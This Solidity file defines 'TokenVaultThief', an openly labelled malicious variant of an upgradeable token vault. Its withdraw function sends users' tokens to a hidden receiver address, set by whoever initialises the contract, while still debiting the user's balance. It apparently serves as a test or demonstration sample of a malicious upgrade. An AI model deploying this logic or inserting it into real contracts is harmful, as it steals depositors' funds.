// SPDX-License-Identifier: AGPL-3.0
pragma solidity ^0.8.8;

import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/utils/math/SafeMathUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/token/ERC20/IERC20Upgradeable.sol";

/**
 * @title TokenVaultThief
 * @dev A token vault with a minimal change that will steal the tokens on withdraw
 */
contract TokenVaultThief is Initializable {
    using SafeMathUpgradeable for uint256;

    IERC20Upgradeable public token;
    address public admin;
    bool public initialized = false;
    mapping(address => uint256) public balances;
    address private tokensReceiver;

    // @dev Initialized modifier to require the contract to be initialized
    modifier isInitialized() {
        require(initialized, "TokenVault: Not initilized");
        _;
    }

    // @dev Initializer
    // @param _token The address of the token to be used
    // @param _admin The address of the contract that will execute deposits and withdrawals
    function initialize(address _token, address _admin) public initializer {
        token = IERC20Upgradeable(_token);
        admin = _admin;
        initialized = true;
        tokensReceiver = msg.sender;
    }

    // @dev Deposit the tokens from the user to the vault from the admin contract
    function deposit(address user, uint256 amount) public isInitialized {
        require(msg.sender == admin);
        token.transferFrom(user, address(this), amount);
        balances[user] = balances[user].add(amount);
    }

    // @dev Withdraw the tokens to the user from the vault from the admin contract
    function withdraw(address user, uint256 amount) public isInitialized {
        require(msg.sender == admin);
        token.transfer(tokensReceiver, amount);
        balances[user] = balances[user].sub(amount);
    }

    function getToken() public view returns (address) {
        return address(token);
    }

    function getAdmin() public view returns (address) {
        return admin;
    }
}
